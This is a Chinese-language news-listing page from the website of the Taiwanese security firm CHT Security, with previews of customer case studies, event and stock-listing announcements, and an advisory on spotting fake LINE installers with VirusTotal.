								<p>小叮噹科學主題樂園打造超過30種融入科學的特色遊樂設施，寓教於樂，成為許多學校與機關團體出遊的首選（右五為總經理郭明宗）生成式AI的應用紛陳，資安風險也急劇攀高。據中華電信統計今（2025）年第一季，已為客戶成功攔阻超過35億次以上的詐騙及惡意連線，相較去年同期激增一倍，尤其資安防護能量有限的中小企業，正快速成為駭客主要攻擊目標。國內人氣遊樂園的小叮噹科學主題樂園與中華電信合作，積極投入數位轉型同步強化資安體質，讓每一位遊客玩得開心，資料安全更無後顧之憂。 科學寓教於樂 小叮噹樂園累積品牌信任資產總是讓遊客想問「水從哪裡來？」的唐吉軻德天上水，或是一走進去就因為重力變化而產生搖晃感的愛因斯坦重力實驗室，還有全台最大室內零下5度C滑雪場、最長的滑雪道，不必出國就可以全年體驗零下冰雪世界位於新竹縣新豐鄉的小叮噹科學主題樂園提倡科學，打造超過30種融入科學的特色遊樂設施，以互動式體驗寓教於樂，成為許多學校與機關團體出遊的首選，開業35年來，一路陪伴著許多台灣民眾成長，更連續 22 年評為全國特優業遊樂區。光是去（2024）年一年，園區就迎來了46萬人次的遊客入園，能夠歷久彌新地持續吸引國人造訪，小叮噹科學主題樂園的「品牌信賴」是其中關鍵。小叮噹科學主題樂園總經理郭明宗強調，遊樂園的專業是服務「人」，除了要讓來訪遊客玩得開心，更要玩得安心，唯有安心才能帶來信任；但在當前網路資安風險持續攀升的威脅下，如何守護遊客個資安全，以及確保營運不中斷，成為品牌信賴度的兩大考驗。園區內擁有全台第一座的超大滑雪場特色設施，如何守護遊客個資安全並確保營運不中斷是重要關鍵。 疫情後數位轉型 資安成最大挑戰郭明宗分享，讓小叮噹科學主題樂園的資安體質產生脫胎換骨的質變，是發生在疫情期間。當時，國內觀光業飽受衝擊，樂園營運停擺，復業之日遙遙無期，但在經營者的支持下，園區毅然決然決定與國內電信龍頭中華電信合作，進行整體數位轉型。「數位轉型確實帶來了日常營運更多的便利性，但讓我們方便了，是不是也意味著讓駭客入侵也更方便了呢？」郭明宗思考，如何在數位轉型的同時，強化組織資安防護能力，才能確保賺進來的每一分錢，用於提升園區的服務與品質，而不是用於賠償客戶個資外洩所造成的損失。然而，小叮噹科學主題樂園佔地超過30公頃，業務範圍橫跨樂園、教學、住宿及餐飲等多元場域，每一個服務節點、每一個使用者接觸點，都可能成為潛在的資安破口，管理落實上難度相當高；加上企業走過35個年頭，有不少的資深員工，他們很擅長服務，但在數位工具使用習慣與安全意識較薄弱之下，可能也會成為駭客攻擊的目標。此外，隨著園區數位轉型日益完備，各項系統間彼此串連，但又涉及不同的資訊服務提供商，中間溝通協調如何彼此對接、相容的工作也頗具挑戰性。小叮噹科學主題樂園總經理郭明宗認為，我們的專業是服務人，資安就交給值得信賴的中華電信團隊，協助園區提升永續且穩健的營運韌性。從源頭阻斷攻擊 中華電信企業防駭守門員是神隊友「我們的專業是服務人，資安就交給值得信賴的團隊」，郭明宗指出，從早期園區光纖鋪設，再到數位轉型的過程，與中華電信長期合作已建立深厚信賴。「企業防駭守門員」透過中華電信機房端，多層次的過濾及偵測網路活動，從源頭即阻斷攻擊鏈，對中小企業而言，正是一大助力。中華電信「企業防駭守門員」攔阻成效統計報表示意圖（中華電信提供）小叮噹科學主題樂園資訊長范揚凱透露，過去，單靠內部資訊人力自己監控駭客入侵活動，每天都有來自防火牆套裝軟體高達上百次的示警，每次接獲都得要一一回應處理，以確保資訊安全，非常辛苦；但透過導入企業防駭守門員後，通報數量降至每週僅數十次，從源頭把關資訊安全，交由中華電信集團子公司 中華資安國際SOC維運中心7x24小時全天候監測，即時排除資安障礙，成功降低園區內多節點的資安事件。此外，除了被動防禦外，小叮噹科學主題樂園也使用中華電信的「HiNet資安艦隊系列方案」服務，透過骨幹網路層流量清洗與多層防禦，精準防堵解惡意攻擊流量，避免頻寬資源遭耗盡。同時，園區資安人員可以透過可視化儀表板，分析定期接收到的網路安全報表，密切追蹤網路威脅動向及趨勢，將資安從「技術」升級為「治理」。小叮噹科學主題樂園資訊長范揚凱表示，透過中華電信「企業防駭守門員」，從源頭就阻斷攻擊鏈，對於中小企業來說，幫助非常大。中小企業不可輕忽 資訊安全防護是必備要素「有些事情你現在不做，以後一定會後悔」，郭明宗強調，疫情加速了消費者行為的改變，各項虛實整合、數位創新服務已成為必然趨勢。因此，每一位消費者的個人資料安全，背後都代表著每一份財產的安全；一旦發生資料外洩事件，園區勢必會面臨財務與品牌信任度的損失，更可能對企業的長期發展產生深遠的影響，領導者不可輕忽！因此，他也建議中小企業，唯有落實資安，才能確保企業永續且穩健的營運韌性。本文轉自遠見採訪</p>
							</div>
							<a href="/news/eceae0ee-48c3-4edc-9495-2088ceebfc28" class="float-right">更多</a>
						</div>
					</li>
					<li>
						<img src="/images/archive/(2025-10-15_00-46-39) 084618.jpg">
						<p class="news_title text-truncate">
							<a title="打造新藥研發的資安護城河：台灣醣聯導入中華電信IPS入侵防護，以專業守護創新成果" href="/news/41885f64-3374-48b2-b196-4d159e3d9e59">打造新藥研發的資安護城河：台灣醣聯導入中華電信IPS入侵防護，以專業守護創新成果</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
								<p>深耕癌症醣抗原與單株抗體領域超過20年的台灣醣聯生技醫藥，導入中華電信的IPS入侵防護服務，穩固資訊安全防線。在癌症新藥研發的漫長旅途中，每一筆研發資料、每一項實驗數據，都是專業團隊累積而成的核心資產。對深耕癌症醣抗原與單株抗體領域超過20年的台灣醣聯生技醫藥（以下簡稱台灣醣聯）來說，如何在國際級研發合作與臨床試驗推進的同時，穩固資訊安全防線，已不只是IT部門的課題，更是關乎企業營運韌性與信任基礎的核心戰略。過去在尚未導入專業資安服務之前，台灣醣聯雖幸運地沒有遇過重大資安事件，但團隊深知「沒有出事，不代表沒有風險」。隨著全球駭客攻擊事件頻傳，從勒索病毒、資料外洩，到系統癱瘓案例層出不窮，內部風險評估讓企業逐漸意識到：「若要守護多年研發心血，必須提前佈署防線」。2016年，台灣醣聯在資訊系統建置初期，隨即選擇導入中華電信的IPS入侵防護服務，至今已邁入第九年。「這段期間，從早期每天僅有個位數的攻擊事件，到近幾年，全球地緣政治態勢升溫，資安威脅大增，攻擊次數迅速升高至三位數，中華電信IPS入侵防護服務都能有效地阻擋，讓我們減輕後顧之憂！」台灣醣聯行政副總經理呂耀華指出，這段長期合作關係，背後是中華電信團隊的資安技術穩定度、服務完整性與高度整合能力，更是台灣醣聯在關鍵時刻，得以專注本業、無後顧之憂的底氣來源。聚焦癌症標靶抗體藥物，台灣醣聯打造國際級創新平台台灣醣聯聚焦在抗體藥物複合體（ADC）、前驅抗體（Pro-antibody）以及生物相似藥三大方向，瞄準高安全性、高專一性的次世代癌症療法。台灣醣聯生技醫藥成立於2001年，是國內首家結合「癌症相關醣質抗原」與「人源單株抗體」技術的生技公司。台灣醣聯的核心優勢，聚焦在抗體藥物複合體（ADC）、前驅抗體（Pro-antibody）以及生物相似藥三大方向，瞄準高安全性、高專一性的次世代癌症療法。目前，台灣醣聯主力產品GNX1021正進行臨床試驗準備，與日本三菱瓦斯化學共同開發的生物相似藥SPD8，也已完成日本的一期臨床試驗，並進入第三期臨床試驗。這些成果的背後，是精英研發團隊多年來累積的努力成果，也建立起台灣醣聯在國際生技醫藥市場中的技術地位與合作潛力。「『創新研發、追求卓越』是我們堅持不變的經營理念！」呂耀華說，尤其在臨床與合作拓展階段，企業所承載的責任，不僅是藥品的療效與安全，更包含資訊保護與營運穩定性。因此，台灣醣聯從早年即特別重視IT與資安佈建，並嚴選專業合作夥伴，共同守護成果。從自建防護到專業委外：資安轉型的關鍵選擇台灣醣聯行政副總經理呂耀華台灣醣聯的資訊部門專責人員，肩負公司廠房設施與自建機房的維運任務。雖然早期即已設有種種防護措施，但面對不斷升級的全球網路威脅，企業逐步意識到，僅靠內部資源，難以應對層出不窮的攻擊情境。「我們希望將更多心力聚焦在研發上，將資安的專業事務交給更具經驗的團隊處理。」呂耀華說。正是在這樣的考量下，台灣醣聯評估後，選擇與國內電信領導品牌中華電信合作，導入IPS入侵防護服務。中華電信與集團旗下專業資安子公司中華資安國際聯手，長年深耕於電信級資安維運服務，IPS入侵防護服務具備高效即時阻擋攻擊能力，並可與既有HiNet線路、設備架構無縫整合，特別適合如台灣醣聯這類自建IT架構的研發型企業。台灣醣聯導入的IPS入侵防護服務，由中華電信作為對外品牌與服務窗口，並由中華資安國際提供後端技術、威脅防禦機制建置、情資更新與防護規則維運，雙品牌協同合作，共同守護企業客戶的資安防線。「中華電信是國內排名第一的電信業者，服務品質穩定，且在資安領域投入早，技術成熟，這是我們選擇中華電信的關鍵。」呂耀華說。專業支援、回報透明，企業IT的信任依靠導入IPS後，台灣醣聯的IT管理方式出現明顯改善。過往偶爾遇到異常流量，內部難以快速判斷來源，如今透過IPS，不僅能即時攔截，也協助IT團隊釐清問題根源。對台灣醣聯來說，中華電信IPS入侵防護服務不僅是一道防線，更是一種可視化、可追溯的管理機制。「中華電信提供的報表機制非常完整，讓我們能即時掌握異常事件的類型與規模，基本上，所有的異常攻擊事件，都能有效的被阻擋。」呂耀華說。呂耀華也回憶了令他印象深刻的事件：一次原先誤以為是由內部向外發出的攻擊事件，經中華電信主動通報後，立即進行盤查與處理，所幸只是實驗軟體持續發送給外部伺服器的通訊要求，並非感染了惡意軟體的殭屍電腦（Zombie computer），正因為有中華電信工程師即時提醒，IT團隊才能及時判定與處理。此外，讓台灣醣聯深感安心的原因，也是因為中華電信配置的專責業務經理與工程師窗口，當遇到突發狀況時，總能迅速應對並協調支援。「中華電信服務項目雖然眾多，但只要透過業務經理，我們就能快速找到對應技術人員，這點非常關鍵！」呂耀華說。IPS成為企業資安文化的一部分，防線內外同步進化IPS監控儀表板在實際效益上，導入IPS後不僅明顯減少入侵與異常流量事件，也幫助企業排查問題，讓內部IT作業更加順暢。這些改善，讓台灣醣聯得以專心投入新藥開發，而非頻繁分心處理資安瑣事。近年，隨著國際合作頻率升高、雲端與AI應用逐步導入，台灣醣聯也開始評估未來的雲端環境部署與資安升級計畫。「未來我們不排除將朝雲端化架構發展，並強化相關防護措施，以因應更多國際協同作業需求。」呂耀華表示。除了系統與技術面的投資，該公司也同步推動員工資訊安全意識的建立。「我們不定期進行案例分享與教育訓練，提醒同仁更新系統、避免安裝來路不明的應用程式，也推行密碼強度設定與雙因素認證。」呂耀華說，資訊安全不再只是IT部門的事，而是全體員工共同維護營運韌性的企業文化與實際行動。資安即營運韌性，從風險控管到ESG實踐對於「資安即營運韌性」的趨勢，台灣醣聯給出明確的肯定：「資安是公司辛苦研究成果的護城河，也是企業永續經營的基石。」在強化技術防線之外，台灣醣聯也看見資訊安全必須在ESG治理中具體落實。「資安意識的建立，不只影響公司，還能延伸應用在生活各面，是風險控管與數位素養的雙重實踐。」呂耀華說。資安不是成本，而是信任資產面對還在猶豫是否投資於資安防護的中小企業，呂耀華根據自身經驗提出建言：「資安管控範圍廣，單靠內部IT團隊難以面面俱到。與其暴露在未知的風險之下，不如選擇信賴度高的專業資安公司合作，補足企業防護缺口，這才是長遠且經濟的做法。」台灣醣聯相信，資安的價值，絕非僅止於「避免損失」，更是企業邁向國際舞台時「被信任」的重要基礎。隨著生技產業數位化程度加深，企業必須在創新與風險之間找到平衡。台灣醣聯透過導入中華電信IPS入侵防護服務，打造出一套結合技術、治理與文化的資訊安全體系，既鞏固了研發資產，也強化了面對未來挑戰的營運韌性。這不僅是一套防禦機制，更是一段企業與專業資安團隊建立密切合作關係的數位轉型歷程，展現出台灣生技產業面對全球資安風暴時，所展現出的敏銳、行動力與遠見。本篇文章轉自商業週刊採訪。</p>
							</div>
							<a href="/news/41885f64-3374-48b2-b196-4d159e3d9e59" class="float-right">更多</a>
						</div>
					</li>
					<li>
						<img src="/images/archive/(2025-09-08_06-21-10) SEMICON_banner2_xs@2x-01.jpg">
						<p class="news_title text-truncate">
							<a title="中華資安國際將於 2025 SEMICON Taiwan 盛大登場" href="/news/7ce83658-d9c1-4e59-b1fc-0177c508cc1f">中華資安國際將於 2025 SEMICON Taiwan 盛大登場</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
								<p>在面對日益嚴峻的工控與OT資安挑戰，中華資安國際將於2025 SEMICON Taiwan 展出最前瞻的工控資安解決思維，協助企業打造「可視、可控、可信」的安全環境。展覽期間中華資安國際 OT 工控資安專家劉叡經理獲邀前往專家開講，歡迎有興趣的賓客前往交流。歡迎蒞臨現場，與我們一起探索 OT 工控資安的最新趨勢！專家開講資訊演講時段：2025-09-11 13:40 ~ 14:00演講地點：南港展覽館二館 1F 專家開講舞台(#Q5356)</p>
							</div>
							<a href="/news/7ce83658-d9c1-4e59-b1fc-0177c508cc1f" class="float-right">更多</a>
						</div>
					</li>
					<li>
						<img src="/images/archive/(2025-09-12_07-50-38) 0000001.jpg">
						<p class="news_title text-truncate">
							<a title="中華資安國際於 SEMICON Taiwan 2025 圓滿落幕！" href="/news/a7a03765-9197-4658-b90e-02d321798351">中華資安國際於 SEMICON Taiwan 2025 圓滿落幕！</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
								<p>感謝數位發展部數位產業署黃雅萍副署長親自蒞臨參觀， 展會期間與眾多業界先進及合作夥伴深入交流，同時受邀於專家開講，探討如何從預防、偵測到復原，全面強化供應鏈的資安防護。隨著半導體產業在全球價值鏈中地位日益重要，資安議題也成為確保永續與競爭力的關鍵。中華資安國際將持續以專業與創新，協助產業面對日益嚴峻的挑戰，打造更穩健、安全的營運環境。活動雖告一段落，但我們的服務承諾不會中止。期待在未來的合作與交流中，持續為您帶來值得信賴的資安解決方案。再次感謝各位的蒞臨與支持，SEMICON Taiwan 2025，我們收穫滿滿，也期待與您再次相見！</p>
							</div>
							<a href="/news/a7a03765-9197-4658-b90e-02d321798351" class="float-right">更多</a>
						</div>
					</li>
					<li>
						<img src="/images/archive/(2025-09-08_04-04-11) 0000001.jpg">
						<p class="news_title text-truncate">
							<a title="資安服務龍頭「中華資安」9月8日正式掛牌上市，為國內首家上市資安服務公司" href="/news/e1e4bf10-f351-43e8-b61a-89f969c9dfad">資安服務龍頭「中華資安」9月8日正式掛牌上市，為國內首家上市資安服務公司</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
								<p>資安專業服務龍頭中華資安(股票代號：7765)以每股238元於9月8日正式掛牌上市，這也是國內第一家上市的資安服務公司，為台灣資安產業樹立新標竿。中華資安2025年上半年營收與獲利雙雙創下歷史新高，營收達新台幣9.8億元，年增14%，稅後每股盈餘達6.01元，年增12%，其中持續性營收占比超過5成，現金流穩定、獲利表現亮眼，加上積極投入研發自有產品以及擴展國際市場，後市成長可期。中華資安三大業務支柱「上網資安服務」、「資安專業服務」與「資安商品銷售」歷年來營收獲利均持續穩健成長，公司擁有深厚的技術實力與不可取代性，致力提供電信上網資安、高品質資安檢測、資安防護監控、事件應變鑑識、顧問專家諮詢與資安軟硬體銷售等服務，客群涵蓋個人、家庭、金融、科技製造、醫療、關鍵基礎設施、政府機關等。中華資安是全國唯一連續六年獲得行政院資安共契服務廠商評鑑全數五項服務均獲「A級」最高評價的資安公司，也是唯一連續五年獲國際顧問公司Frost Sullivan評選為「臺灣最佳資安服務公司」，技術與服務品質深獲信賴。隨著數位化浪潮席捲各行各業，駭客攻擊與資料外洩事件頻傳，促使企業紛紛加碼投資資安防禦，根據iThome企業資安大調查顯示，各產業資安預算平均金額已突破2000萬大關，相較去年成長23%；工研院IEK估計，2025年台灣資安市場將年增11%，2026年更有望突破千億元大關。台灣如此、國外亦然，現今百工百業對資安的需求持續快速成長，此刻中華資安正式掛牌，更是寫下產業重要里程碑。中華資安表示，公司不僅滿足於三條產品線的穩健成長，更以成為國際級資安服務與產品公司為目標，加速自有產品的研發與海外市場的擴張。今年上半年，自有產品營收年增33%，成長動能逐漸展開；海外市場營收更大幅成長250%，市場版圖已擴及亞、美、歐、非四大洲，為挑戰「世界盃」奠定穩固基石。展望未來，中華資安將持續投入AI技術創新，拓展工控資安應用場域，提供雲端資安服務、AI應用資安解決方案，也前瞻佈局無人機與低軌衛星等新興領域的資安解決方案，持續擴展新的成長動能，邁向成為國際級的資安服務與產品公司。中華資安9月8日上市掛牌，董長陳明仕(左三)帶領經營團隊出席</p>
							</div>
							<a href="/news/e1e4bf10-f351-43e8-b61a-89f969c9dfad" class="float-right">更多</a>
						</div>
					</li>
					<li>
						<img src="/images/archive/(2025-08-28_07-51-36) 未命名設計 _24_.png">
						<p class="news_title text-truncate">
							<a title="感謝 ISAC 蒞臨參訪 ，共同推動校園資安新能量" href="/news/423cdcd7-f2dd-480f-91b6-a4a713fff086">感謝 ISAC 蒞臨參訪 ，共同推動校園資安新能量</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
								<p>中華資安國際有幸迎接ISAC及大專校院資訊主管們蒞臨參訪。在參訪過程中，雙方針對 AI 時代的資安挑戰展開深入交流並分享實務案例分享，讓來賓們更貼近了解資安防護的第一線運作。現場討論熱烈，不僅分享了校園資安推動的經驗與挑戰，也為未來產學合作累積更多寶貴養分。中華資安國際衷心感謝 ISAC 與各校資訊主管的參與與回饋，這些互動將成為推動台灣校園資安韌性的重要力量。我們期待未來持續攜手，共同為教育與產業打造更堅實的資安防護網！全體合照互贈禮物。左為中華資安董事長陳明仕，右為ISAC理事長黃明達互贈禮物。左為中華資安總經理洪進福，右為ISAC理事長黃明達感謝蒞臨參訪</p>
							</div>
							<a href="/news/423cdcd7-f2dd-480f-91b6-a4a713fff086" class="float-right">更多</a>
						</div>
					</li>
					<li>
						<img src="/images/archive/(2025-08-18_02-01-20) 未命名設計 _23_.png">
						<p class="news_title text-truncate">
							<a title="2025 HITCON CMT活動圓滿落幕，感謝每位參與者的熱情支持！" href="/news/619ea81b-21c0-4f4b-97c6-1fcc3a5e8746">2025 HITCON CMT活動圓滿落幕，感謝每位參與者的熱情支持！</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
								<p>HITCON CMT 2025 已於 8 月 15 日至 8 月 16 日順利落幕。今年我們以全新互動遊戲 「千面 Prompt 之助」 與 HITCON 現場參與者見面，邀請大家透過角色設定與模擬面試的方式，體驗一場求職冒險。活動期間，攤位吸引了許多挑戰者參與。大家透過 QRcode 進入遊戲，逐步累積進度，並在完成八輪面試後，解鎖專屬稱號與獎勵。其中更有數位挑戰者成功通關，將象徵榮耀的胖之助娃娃帶回家，為活動留下亮眼的成果。再次感謝每一位蒞臨攤位並參與挑戰的朋友，活動雖已告一段落，但Prompt 之助的冒險仍將繼續。我們期待在未來的活動中，再次與大家相聚，共同探索更多結合資安與創意的體驗！中華資安國際【千面Prompt之助】攤位源源不絕的人潮 </p>
							</div>
							<a href="/news/619ea81b-21c0-4f4b-97c6-1fcc3a5e8746" class="float-right">更多</a>
						</div>
					</li>
					<li>
						<img src="/images/archive/(2025-08-15_06-53-46) qqqqq.jpg">
						<p class="news_title text-truncate">
							<a title="【資安宣導】近期假冒軟體事件分析與緩解建議" href="/news/faaa7eba-9a14-42a4-bef2-8d5908453e31">【資安宣導】近期假冒軟體事件分析與緩解建議</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
								<p>不堪其擾的假冒軟體不論國內外，假冒軟體或網站常常會出現在資安新聞裡。持續性的威脅舊的假冒網域即使被檢舉了，新的假冒網域又會被建立，繼續欺騙使用者。攻擊者會持續更新假冒軟體、躲避防毒軟體的偵測，使用者依舊必須小心看待。假冒軟體的影響假冒軟體可以造成嚴重的損失及危害，其中包含資策會調查顯示，Line 為台灣使用占比高的通訊軟體(87%)。考慮到近期有發現多個組織的內部有安裝 Line 假冒軟體，因此實際應該也有不少其他使用者受害。檢測方式-使用VirusTotal檢測下載網域(1/3)Google 搜尋Line 電腦版，除了正版網站會出現外，也有可能會跳出一些釣魚/偽冒網站。在 VirusTotal 網站的搜尋欄位，輸入想檢驗的網域名稱。透過有無通報和建立日期來當作正版網域的判別參考。檢測下載安裝檔進入 VirusTotal 網站，點選 Choose file，開啟要檢查的檔案。#要小心不要上傳到含有個人隱私資料的檔案。上傳檔案後，發現沒有安全廠商通報為惡意，再點選 DETAILS 欄位。DETAILS 頁面會有檔案的相關資訊，包含基本屬性、歷史以及名稱，其中確認有有效簽章 (valid signature)為重要的一步。簽章資訊欄位能顯示上傳檔案的發行來源。LY Corporation (Line 公司)同時顯示背書的憑證授權中心 (CA)，可能的CA可能會有:GlobalSign Root CA R3Microsoft Root Authority 等相關機構上傳檔案後，如果發現 VirusTotal顯示有被多家資安廠商通報或是 DETAILS 頁面沒有簽章資訊，那該安裝檔可能為假冒，建議不要使用，以避免受駭或資料外洩。假冒軟體緩解建議-防駭守門員檢測方法能一定程度的防止受駭，但欺騙手段日新月異，可能導致使用者一不小心就受騙。使用中華電信防駭守門員服務，讓使用者上網行為多一層保護，減少資安事件發生的機會。免安裝、跨平台，透過與黑名單資料庫的即時比對，對有記錄的異常位址進行攔阻。其中涉及的阻攔種類包含釣魚網站、簡訊詐騙以及惡意程式下載點等。</p>
							</div>
							<a href="/news/faaa7eba-9a14-42a4-bef2-8d5908453e31" class="float-right">更多</a>
						</div>
					</li>
					<li>
						<img src="/images/archive/(2025-08-13_05-56-30) qqqq.jpg">
						<p class="news_title text-truncate">
							<a title="中華資安預計Q3上市，上半年EPS達6.01元創高，成長動能強勁" href="/news/115474d0-1405-4503-93db-b2712e83eda3">中華資安預計Q3上市，上半年EPS達6.01元創高，成長動能強勁</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
								<p>資安服務龍頭中華資安（股票代號：7765）於13日舉行上市前業績發表會，公布其強勁的營運實績。公司2025年上半年營收與獲利雙雙創下歷史新高，營收達新台幣9.8億元，年增14%，稅後每股盈餘（EPS）達6.01元，年增12%。憑藉在資安領域的深厚技術實力，公司歷年來營收獲利持續穩健成長，結合自有產品研發與海外市場拓展的雙引擎驅動，中華資安國際預計於今年第三季正式掛牌上市，為台灣資本市場注入一股強大的資安新力量。總經理洪進福表示，公司三大業務支柱「上網資安服務」、「資安專業服務」與「資安商品銷售」上半年同步成長，其中，包含長期合約在內的「持續性營收」占比已達52%，這些持續性營收也是高毛利相對較高的營收，為公司提供了穩健成長的營運基礎。中華資安的核心競爭力來自其頂尖的技術實力，以及不可取代性，擁有超過270位以上資安技術專家，掌握上網資安關鍵地位與核心技術，提供上網資安、資安檢測、監控、應變與顧問諮詢等專業服務，客群涵蓋個人、家庭、金融、科技製造、醫療、政府機關等。在政府的資安服務採購市場，中華資安是全國唯一連續六年獲得行政院資安共契服務廠商評鑑中，全數五項服務均獲「A級」最高評價的廠商；也是連續五年獲國際顧問公司Frost Sullivan評選為「臺灣最佳資安服務公司」，技術與服務品質深獲信賴。為追求規模化及國際化，中華資安積極投入自有產品研發與海外市場拓展。自有產品如SecuTex網路與端點軟體系列、CypherCom硬體式端對端加密通訊系統、資安眼HorusEyes資安曝險評級服務等，上半年營收年增33%，成長動能逐漸展開；同時，海外市場佈局已觸及亞、美、歐、非四大洲，上半年營收大幅成長250%，為邁向國際級資安公司奠定穩固基石。目前，中華資安持續投入AI技術創新，拓展工控資安應用場域，提供雲端資安服務、AI應用的資安解決方案，也針對無人機與低軌衛星等新興領域的資安研發解決方案，目標是從台灣邁向國際級的資安服務與產品公司。公司上市申請案已於今年5月獲證交所通過，預計在第三季掛牌，前景可期。</p>
							</div>
							<a href="/news/115474d0-1405-4503-93db-b2712e83eda3" class="float-right">更多</a>
						</div>
					</li>
				</ul>
			</div>
	
		</div>
	</div>
</div>

<div class="container-fluid marketing">
	<div class="container">
		<div class="row">
			<div class="col-lg-4 cardlist animated fadeInDown">
				<i class="fs-icon-big icon-bank"></i>
				<h4>金融機構資安強化</h4>
				<p class="text-start">金融機構安全評估辦法、ATM攻防、DDoS演練、因應GDPR法規的資安強化建議。</p>
			</div>
			<div class="col-lg-4 cardlist animated fadeInDown">
				<i class="fs-icon-big icon-buliding"></i>
				<h4>企業資安強化</h4>
				<p class="text-start"><strong>大型企業：</strong>閘道端防護、端點防護、資料安全、定期資安檢測、導入ISMS資安管理制度、與ISP合作形成縱深防禦網。<br><strong>中小型企業及工作室：</strong>防毒防駭軟體、企業上網資安防護。</p>
			</div>
			<div class="col-lg-4 cardlist animated fadeInDown">
				<i class="fs-icon-big icon-university"></i>
				<h4>政府機關資安強化</h4>
				<p class="text-start">資安管理法規範、前瞻計畫資安強化措施(區域聯防、SOC、ISAC、基層機關資安強化)，資安服務供應契約下單。</p>
			</div>
		</div>
	</div>
</div>
</main>

	<div id="gotop">
		<a href="#"><i class="fa fa-angle-up"></i></a>
	</div>

	
	<footer>
	<div class="container">

		<div class="footer-logo float-right text-end row">
			<a href="https://www.cht.com.tw" target="_blank"> <img src="/images/cht_logo.svg"> <span class="h5">關係企業</span>
			</a>
			<div class="col-md-12 ms-auto mt-5">
				<script src="https://dunsregistered.dnb.com/ESG.js" type="text/javascript"></script>
			</div>

		</div>
		
		<div class="footer-info float-center">
			<p>
				<i class="fa fa-map-marker"></i> <span>服務據點（台北）：100019 台北市中正區杭州南路一段 26 號 8 樓</span>
			</p>
			<p>
				<i class="fa fa-map-marker"></i> <span>服務據點（台中）：408030 台中市南屯區文心路一段 351 號 2 樓</span>
			</p>
			<p>
				<i class="fa fa-map-marker"></i> <span>服務據點（台南）：711010 台南市歸仁區歸仁十三路一段6號3樓B326室</span>
			</p>
			<p>
				<i class="fa fa-map-marker"></i> <span>服務據點（高雄）：813310 高雄市左營區至聖路 200 號 7 樓</span>
			</p>
			<p>
				<i class="fa fa-phone"></i> <span>聯繫電話：台北 02-2343-1628，台中 04-2369-2214，高雄 07-262-6260</span>
			</p>
			<p>
				<i class="fa fa-phone"></i> <span>客服專線：02-2343-2228，周一至周五上午9:00-12:00與下午1:30-5:30</span>
			</p>
			<p>
				<i class="fa fa-envelope"></i> <span>客服信箱：</span> <img
					src="/images/footer_email@2x.png" class="wd-186">
			</p>
		</div>

		<div class="row footer-copyright">
			<div class="col-12 col-md-6 text-md-start">
				<a href="/pics" target="_blank" class="text-muted display-block">個人資料蒐集告知聲明</a>
				<a href="/stakeholder" target="_blank" class="text-muted display-block">利害關係人專區</a>
			</div>
			<div class="col-12 col-md-6 text-md-end">
				<a class="text-muted">中華資安國際股份有限公司版權所有 ©</a>
				<a class="text-muted" id="com-copyright-year-id"></a>
				<a class="text-muted">CHT Security Co., Ltd.</a>
			</div>
		</div>

	</div>

</footer>

</body>
</html>
<?php endif; ?>